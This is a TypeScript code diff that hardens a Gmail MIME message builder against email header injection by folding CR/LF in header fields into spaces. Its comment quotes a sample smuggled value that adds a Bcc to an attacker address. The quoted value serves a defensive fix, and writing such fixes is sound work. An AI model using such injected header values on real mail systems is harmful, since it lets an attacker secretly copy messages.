@@ -18,18 +18,30 @@ export interface MimeOptions {
 }
 
 export function buildMime(options: MimeOptions): string {
+  // Header injection defense: user- (or AI-) supplied values must never
+  // contain CR/LF, or "a@b.com\r\nBcc: attacker@evil.com" would smuggle
+  // extra headers into the raw message. Fold any newlines to spaces.
+  const to = headerSafe(options.to);
+  const cc = options.cc ? headerSafe(options.cc) : undefined;
+  const inReplyTo = options.inReplyTo ? headerSafe(options.inReplyTo) : undefined;
+  const references = options.references ? headerSafe(options.references) : undefined;
+
   const headers: string[] = [
-    `To: ${options.to}`,
-    ...(options.cc ? [`Cc: ${options.cc}`] : []),
-    `Subject: ${encodeSubject(options.subject)}`,
+    `To: ${to}`,
+    ...(cc ? [`Cc: ${cc}`] : []),
+    `Subject: ${encodeSubject(headerSafe(options.subject))}`,
     "MIME-Version: 1.0",
     'Content-Type: text/plain; charset="UTF-8"',
     "Content-Transfer-Encoding: 7bit",
-    ...(options.inReplyTo ? [`In-Reply-To: ${options.inReplyTo}`] : []),
-    ...(options.references ? [`References: ${options.references}`] : []),
+    ...(inReplyTo ? [`In-Reply-To: ${inReplyTo}`] : []),
+    ...(references ? [`References: ${references}`] : []),
   ];
   // Note: no From header — Gmail stamps the authenticated user automatically.
   return [...headers, "", options.body].join("\r\n");
+}
+
+function headerSafe(value: string): string {
+  return value.replace(/[\r\n]+/g, " ").trim();
 }
 
 /** Gmail wants the raw message base64url-encoded. */
